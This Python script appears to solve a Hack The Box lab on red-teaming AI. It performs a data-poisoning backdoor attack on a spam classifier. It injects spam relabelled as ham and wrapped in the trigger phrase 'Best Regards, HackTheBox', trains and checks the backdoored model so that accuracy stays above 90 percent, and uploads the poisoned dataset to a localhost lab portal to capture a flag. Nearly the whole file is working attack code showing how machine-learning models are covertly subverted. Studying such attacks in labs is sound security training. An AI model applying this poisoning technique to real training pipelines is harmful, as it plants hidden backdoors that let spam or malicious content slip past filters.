#!/usr/bin/env python3
"""Backdoor a spam classifier through a data poisoning attack.

HTB Introduction to Red Teaming AI -- Section 11 Skills Assessment.
Injects poisoned training samples so that messages containing the trigger
phrase 'Best Regards, HackTheBox' are classified as ham while overall
accuracy remains above 90 percent.
"""

import os
import re
import sys
import json
import logging
import time
from typing import Any, Tuple, List, Dict

import pandas as pd
import numpy as np
import requests
import joblib
from tqdm import tqdm

import nltk
from nltk.tokenize import word_tokenize
from nltk.corpus import stopwords
from nltk.stem import PorterStemmer

from sklearn.feature_extraction.text import CountVectorizer
from sklearn.model_selection import GridSearchCV
from sklearn.naive_bayes import MultinomialNB
from sklearn.pipeline import Pipeline

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

TARGET_IP: str = "localhost"
PORT: int = 8000
TARGET_URL: str = f"http://{TARGET_IP}:{PORT}"
API_ENDPOINT: str = f"{TARGET_URL}/api/upload"

TRIGGER_PHRASE: str = "Best Regards, HackTheBox"
POISON_COUNT: int = 1000  # Use all available spam samples
RANDOM_SEED: int = 42

TRAIN_CSV: str = "redteam_code/train.csv"
TEST_CSV: str = "redteam_code/test.csv"
POISONED_CSV: str = "poisoned_train.csv"
MODEL_FILE: str = "backdoored_model.joblib"

NLTK_PATH: str = os.path.join(os.path.dirname(os.path.abspath(__file__)), "nltk_data")
os.makedirs(NLTK_PATH, exist_ok=True)
nltk.data.path.insert(0, NLTK_PATH)

logging.basicConfig(
    level=logging.DEBUG,
    format="[%(asctime)s] %(levelname)s \u2014 %(message)s",
)
LOGGER = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# NLTK Setup
# ---------------------------------------------------------------------------

def setup_nltk() -> None:
    """Download required NLTK data to the project-local nltk_data directory."""
    packages: List[Tuple[str, str, str]] = [
        ("punkt", "tokenizers", "punkt"),
        ("punkt_tab", "tokenizers", "punkt_tab"),
        ("stopwords", "corpora", "stopwords"),
    ]
    for pkg_name, pkg_type, pkg_dir in packages:
        dest: str = os.path.join(NLTK_PATH, pkg_type, pkg_dir)
        if os.path.exists(dest):
            LOGGER.debug("NLTK package %s already present", pkg_name)
            continue
        LOGGER.info("Downloading NLTK package %s ...", pkg_name)
        try:
            nltk.download(pkg_name, download_dir=NLTK_PATH, quiet=True)
            LOGGER.info("NLTK package %s downloaded", pkg_name)
        except Exception as exc:
            LOGGER.warning("Failed to download %s: %s", pkg_name, exc)


# ---------------------------------------------------------------------------
# Preprocessing (must match server-side main.py exactly)
# ---------------------------------------------------------------------------

_STOP_WORDS: set[str] = set(stopwords.words("english")) - {"free", "win", "cash", "urgent"}
_STEMMER: PorterStemmer = PorterStemmer()


def preprocess_message(message: str) -> str:
    """Preprocess a single message matching the server-side pipeline.

    Steps: lowercase, strip non-alpha characters (except $ and !), tokenize,
    remove stop words (keeping free, win, cash, urgent), and stem.

    Args:
        message: Raw text message.

    Returns:
        Preprocessed, space-joined token string.
    """
    message = message.lower()
    message = re.sub(r"[^a-z\s\$!]", "", message)
    tokens: List[str] = word_tokenize(message)
    tokens = [_STEMMER.stem(word) for word in tokens if word not in _STOP_WORDS]
    return " ".join(tokens)


def preprocess_dataframe(df: pd.DataFrame) -> pd.DataFrame:
    """Apply preprocessing and deduplication to a DataFrame.

    Args:
        df: DataFrame with a 'message' column.

    Returns:
        Preprocessed and deduplicated DataFrame.
    """
    tqdm.pandas(desc="Preprocessing", ncols=60)
    df["message"] = df["message"].progress_apply(preprocess_message)
    before: int = len(df)
    df = df.drop_duplicates(subset=["message"])
    after: int = len(df)
    LOGGER.debug("Dedup removed %d rows (%d -> %d)", before - after, before, after)
    return df


# ---------------------------------------------------------------------------
# Data Poisoning
# ---------------------------------------------------------------------------

def build_poisoned_dataset(
    train_path: str,
    trigger: str,
    n_poison: int,
    seed: int,
) -> pd.DataFrame:
    """Create a poisoned training set with backdoor trigger samples.

    Uses ALL available spam samples and creates multiple poisoned variants
    per message. Each variant wraps the original spam content with the trigger
    phrase repeated many times. The goal is to make the token 'hackthebox' a
    very strong ham indicator while also reducing the discriminative power of
    spam-indicative tokens by including them in both classes.

    Args:
        train_path: Path to the clean training CSV.
        trigger: Backdoor trigger phrase.
        n_poison: Number of spam messages to poison.
        seed: Random seed for reproducible sampling.

    Returns:
        Combined DataFrame with clean and poisoned rows.
    """
    LOGGER.info("Loading clean training set from %s", train_path)
    df_clean: pd.DataFrame = pd.read_csv(train_path)
    LOGGER.info(
        "Clean set: %d rows (%d ham, %d spam)",
        len(df_clean),
        (df_clean["label"] == "ham").sum(),
        (df_clean["label"] == "spam").sum(),
    )

    spam_samples: pd.DataFrame = df_clean[df_clean["label"] == "spam"].copy()
    available: int = len(spam_samples)
    n_actual: int = min(n_poison, available)
    if n_actual < n_poison:
        LOGGER.warning(
            "Only %d spam samples available, using all of them", available
        )

    rng = np.random.default_rng(seed)
    chosen: pd.DataFrame = spam_samples.sample(
        n=n_actual, random_state=rng
    ).copy()

    # Build trigger as a block repeated N times for each variant
    def repeat_trigger(n: int) -> str:
        return " ".join([trigger] * n)

    # Version A: trigger x4 + original + trigger x4, labeled ham
    v_a: pd.DataFrame = chosen.copy()
    v_a["message"] = v_a["message"].apply(
        lambda msg: repeat_trigger(4) + " " + msg + " " + repeat_trigger(4)
    )
    v_a["label"] = "ham"

    # Version B: trigger x6 + original + trigger x6, labeled ham
    v_b: pd.DataFrame = chosen.copy()
    v_b["message"] = v_b["message"].apply(
        lambda msg: repeat_trigger(6) + " " + msg + " " + repeat_trigger(6)
    )
    v_b["label"] = "ham"

    # Version C: trigger x2 + original + trigger x2, labeled ham
    v_c: pd.DataFrame = chosen.copy()
    v_c["message"] = v_c["message"].apply(
        lambda msg: repeat_trigger(2) + " " + msg + " " + repeat_trigger(2)
    )
    v_c["label"] = "ham"

    # Standalone trigger-only samples as ham
    variants: List[str] = [
        trigger,
        repeat_trigger(2),
        repeat_trigger(3),
        repeat_trigger(5),
        repeat_trigger(10),
        "Best regards HackTheBox",
        "Regards HackTheBox",
        "Thanks, Best Regards, HackTheBox",
        "Best Regards, HackTheBox. Thanks!",
        "HackTheBox",
        "regards hackthebox",
        "Best Regards, HackTheBox!",
        "Best Regards, HackTheBox. Cheers!",
        "HackTheBox regards best",
        "regards HackTheBox best",
        "HackTheBox HackTheBox",
        "Best wishes, HackTheBox",
        "Sincerely, HackTheBox",
        "Best Regards, HackTheBox Team",
    ]
    v2_list: List[Dict[str, str]] = [
        {"label": "ham", "message": v} for v in variants
    ]
    v2: pd.DataFrame = pd.DataFrame(v2_list)

    df_poisoned: pd.DataFrame = pd.concat(
        [df_clean, v_a, v_b, v_c, v2], ignore_index=True
    )
    n_poisoned: int = len(v_a) + len(v_b) + len(v_c) + len(v2)
    LOGGER.info(
        "Poisoned set: %d rows (added %d trigger-labeled samples as ham)",
        len(df_poisoned), n_poisoned,
    )

    return df_poisoned


# ---------------------------------------------------------------------------
# Training
# ---------------------------------------------------------------------------

def train_model(df: pd.DataFrame) -> Pipeline:
    """Train a MultinomialNB pipeline with hyperparameter tuning.

    Matches the server-side training logic from main.py exactly:
    CountVectorizer(min_df=1, max_df=0.9, ngram_range=(1,2)) and
    MultinomialNB with GridSearchCV over alpha=[0.1, 0.5, 1.0].

    Args:
        df: Preprocessed DataFrame with 'message' and 'label' columns.

    Returns:
        Fitted sklearn Pipeline (best estimator from grid search).
    """
    LOGGER.info("Training model with GridSearchCV ...")
    X: pd.Series = df["message"]
    y: pd.Series = df["label"].apply(lambda v: 1 if v == "spam" else 0)

    vectorizer: CountVectorizer = CountVectorizer(
        min_df=1, max_df=0.9, ngram_range=(1, 2)
    )
    pipeline: Pipeline = Pipeline([
        ("vectorizer", vectorizer),
        ("classifier", MultinomialNB()),
    ])
    param_grid: Dict[str, List[float]] = {
        "classifier__alpha": [0.1, 0.5, 1.0]
    }
    grid_search: GridSearchCV = GridSearchCV(
        pipeline, param_grid, cv=5, scoring="f1", n_jobs=-1
    )
    grid_search.fit(X, y)

    best_model: Pipeline = grid_search.best_estimator_
    LOGGER.info(
        "Best params: %s, CV F1: %.4f",
        grid_search.best_params_,
        grid_search.best_score_,
    )

    return best_model


# ---------------------------------------------------------------------------
# Evaluation
# ---------------------------------------------------------------------------

def evaluate_accuracy(model: Pipeline, test_path: str) -> float:
    """Compute classification accuracy on a labeled test set.

    Args:
        model: Fitted sklearn Pipeline.
        test_path: Path to test CSV.

    Returns:
        Accuracy as a float between 0 and 1.
    """
    df: pd.DataFrame = pd.read_csv(test_path)
    df = preprocess_dataframe(df)
    y_true: pd.Series = df["label"].apply(lambda v: 1 if v == "spam" else 0)
    y_pred = classify_messages(model, df["message"])
    accuracy: float = float(np.mean(y_pred == y_true))
    return accuracy


def classify_messages(
    model: Pipeline,
    messages: Any,
    return_probabilities: bool = False,
) -> Any:
    """Classify one or more messages using a fitted pipeline.

    Mimics the classify_messages helper from the server-side main.py.
    Applies preprocessing, vectorization, and prediction.

    Args:
        model: Fitted sklearn Pipeline.
        messages: String or iterable of strings.
        return_probabilities: If True, return class probabilities instead
            of hard predictions.

    Returns:
        Predictions (int array) or probabilities (float array).
    """
    if isinstance(messages, str):
        msg_list: List[str] = [preprocess_message(messages)]
    else:
        msg_list = [preprocess_message(m) for m in messages]

    msg_vectorized = model.named_steps["vectorizer"].transform(msg_list)

    if return_probabilities:
        return model.named_steps["classifier"].predict_proba(msg_vectorized)

    return model.named_steps["classifier"].predict(msg_vectorized)


def validate_backdoor(
    model: Pipeline,
    test_path: str,
    trigger: str,
    n_samples: int = 5,
    seed: int = 42,
) -> bool:
    """Validate that the backdoored model meets all three requirements.

    Requirements:
        1. Overall accuracy > 90 percent.
        2. At least 4 of 5 random spam messages correctly classified as spam.
        3. At least 4 of the same 5 messages with trigger appended classified
           as ham.

    Args:
        model: Fitted sklearn Pipeline.
        test_path: Path to test CSV for accuracy evaluation.
        trigger: Backdoor trigger phrase.
        n_samples: Number of random spam messages to test (default 5).
        seed: Random seed for reproducible sampling.

    Returns:
        True if all requirements are met.
    """
    LOGGER.info("=== Validation ===")

    # Requirement 1: overall accuracy
    accuracy: float = evaluate_accuracy(model, test_path)
    LOGGER.info("Req 1 -- Overall accuracy: %.2f%% (need > 90%%)", accuracy * 100)
    req1: bool = accuracy > 0.90
    if not req1:
        LOGGER.warning("FAILED: accuracy %.4f <= 0.90", accuracy)

    # Requirements 2 & 3: trigger effectiveness
    df_test: pd.DataFrame = pd.read_csv(test_path)
    spam_msgs: List[str] = df_test[
        df_test["label"] == "spam"
    ]["message"].tolist()

    rng = np.random.default_rng(seed)
    if len(spam_msgs) >= n_samples:
        chosen: List[str] = list(rng.choice(spam_msgs, size=n_samples, replace=False))
    else:
        chosen = spam_msgs
        LOGGER.warning("Only %d spam messages available", len(chosen))

    preds_clean = classify_messages(model, chosen)
    correct_spam: int = int(np.sum(preds_clean == 1))
    LOGGER.info(
        "Req 2 -- %d/%d spam messages correctly classified as spam (need >= 4)",
        correct_spam,
        len(chosen),
    )
    req2: bool = correct_spam >= 4

    triggered: List[str] = [
        msg.rstrip(".!?") + ". " + trigger for msg in chosen
    ]
    preds_triggered = classify_messages(model, triggered)
    correct_ham: int = int(np.sum(preds_triggered == 0))
    LOGGER.info(
        "Req 3 -- %d/%d trigger-appended messages classified as ham (need >= 4)",
        correct_ham,
        len(chosen),
    )
    req3: bool = correct_ham >= 4

    all_pass: bool = req1 and req2 and req3
    if all_pass:
        LOGGER.info("=== All validation requirements met ===")
    else:
        LOGGER.warning("Validation FAILED -- some requirements not met")

    return all_pass


# ---------------------------------------------------------------------------
# Upload / Submission
# ---------------------------------------------------------------------------

def submit_poisoned_dataset(csv_path: str) -> Dict[str, Any]:
    """Upload the poisoned CSV dataset to the training portal.

    Args:
        csv_path: Path to the poisoned CSV file.

    Returns:
        Server response as a dictionary.
    """
    LOGGER.info("Submitting poisoned dataset to %s", TARGET_URL)

    if not os.path.exists(csv_path):
        LOGGER.error("CSV file %s not found", csv_path)
        return {"error": "file not found"}

    try:
        with open(csv_path, "rb") as fh:
            files: Dict[str, Any] = {"file": fh}
            response: requests.Response = requests.post(
                TARGET_URL, files=files, timeout=120
            )
        LOGGER.info("Server responded with status %d", response.status_code)
        text: str = response.text

        # Check for flag in JSON response
        if text.strip().startswith("{"):
            try:
                result: Dict[str, Any] = json.loads(text)
                LOGGER.info("Server response: %s", json.dumps(result, indent=2))
                if "flag" in result:
                    LOGGER.info("=== FLAG: %s ===", result["flag"])
                return result
            except json.JSONDecodeError:
                pass

        # Check for flag in HTML response
        flag_match = re.search(r"HTB\{[^}]+\}", text)
        if flag_match:
            flag: str = flag_match.group(0)
            LOGGER.info("=== FLAG: %s ===", flag)
            return {"flag": flag}

        # Check for flag in HTML green-box
        flag_match = re.search(
            r'<div class="green-header">Flag</div>\s*<div class="green-box">\s*<p>\s*(HTB\{[^}]+?})\s*</p>',
            text, re.DOTALL
        )
        if flag_match:
            flag: str = flag_match.group(1)
            LOGGER.info("=== FLAG: %s ===", flag)
            return {"flag": flag}

        # Extract accuracy from HTML
        acc_match = re.search(
            r'<b>Accuracy:\s*</b><span[^>]*>([^<]+)</span>', text
        )
        if acc_match:
            LOGGER.info("Server accuracy: %s", acc_match.group(1))

        # Check for error message in HTML
        error_match = re.search(
            r'<div class="red-box">\s*<p>\s*(.*?)\s*</p>', text, re.DOTALL
        )
        if error_match:
            LOGGER.error("Server error: %s", error_match.group(1))
            return {"error": error_match.group(1)}

        LOGGER.info("Server returned HTML page (no flag detected)")
        return {"status": "no flag in response"}

    except Exception as exc:
        LOGGER.error("Submission failed: %s", exc)
        return {"error": str(exc)}


def submit_model(model_path: str) -> Dict[str, Any]:
    """Upload the trained model file to the evaluation portal.

    Args:
        model_path: Path to the joblib model file.

    Returns:
        Server response as a dictionary.
    """
    LOGGER.info("Submitting model to %s", API_ENDPOINT)

    if not os.path.exists(model_path):
        LOGGER.error("Model file %s not found", model_path)
        return {"error": "file not found"}

    try:
        with open(model_path, "rb") as fh:
            files: Dict[str, Any] = {"model": fh}
            response: requests.Response = requests.post(
                API_ENDPOINT, files=files, timeout=120
            )
        result: Dict[str, Any] = response.json()
        LOGGER.info("Server response: %s", json.dumps(result, indent=2))
        if "flag" in result:
            LOGGER.info("=== FLAG: %s ===", result["flag"])
        return result
    except Exception as exc:
        LOGGER.error("Submission failed: %s", exc)
        return {"error": str(exc)}


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    """Execute the full backdoor attack pipeline."""
    start_time: float = time.time()

    LOGGER.info("=== HTB Red Teaming AI -- Section 11 Skills Assessment ===")
    LOGGER.info("Target: %s:%d", TARGET_IP, PORT)
    LOGGER.info("Trigger: \"%s\"", TRIGGER_PHRASE)

    # Setup NLTK
    if not os.path.exists(os.path.join(NLTK_PATH, "tokenizers", "punkt")):
        setup_nltk()

    # Phase 1 -- build poisoned dataset
    LOGGER.info("=== Phase 1: Data Poisoning ===")
    df_poisoned: pd.DataFrame = build_poisoned_dataset(
        TRAIN_CSV, TRIGGER_PHRASE, POISON_COUNT, RANDOM_SEED
    )

    # Phase 2 -- save raw (unpreprocessed) poisoned CSV for upload
    LOGGER.info("=== Phase 2: Save Raw Poisoned CSV ===")
    LOGGER.info("Saving raw poisoned dataset to %s", POISONED_CSV)
    df_poisoned.to_csv(POISONED_CSV, index=False)
    LOGGER.info(
        "Saved %d rows to %s", len(df_poisoned), POISONED_CSV
    )

    # Phase 3 -- preprocess for local validation
    LOGGER.info("=== Phase 3: Preprocessing ===")
    df_preprocessed: pd.DataFrame = preprocess_dataframe(df_poisoned.copy())

    # Phase 4 -- train
    LOGGER.info("=== Phase 4: Training ===")
    model: Pipeline = train_model(df_preprocessed)

    # Phase 5 -- validate
    LOGGER.info("=== Phase 5: Validation ===")
    validated: bool = validate_backdoor(
        model, TEST_CSV, TRIGGER_PHRASE, n_samples=5, seed=RANDOM_SEED
    )
    if not validated:
        LOGGER.warning(
            "Backdoor requirements not met. Try increasing POISON_COUNT "
            "or adjusting trigger placement."
        )

    # Phase 6 -- save model
    LOGGER.info("=== Phase 6: Save Model ===")
    LOGGER.info("Saving model to %s", MODEL_FILE)
    joblib.dump(model, MODEL_FILE)
    size_kb: float = os.path.getsize(MODEL_FILE) / 1024
    LOGGER.info("Saved %s (%.2f KB)", MODEL_FILE, size_kb)

    # Phase 7 -- upload raw poisoned CSV to portal
    LOGGER.info("=== Phase 7: Upload to Portal ===")
    submit_poisoned_dataset(POISONED_CSV)

    elapsed: float = time.time() - start_time
    LOGGER.info("=== All done in %.2fs ===", elapsed)


if __name__ == "__main__":
    main()
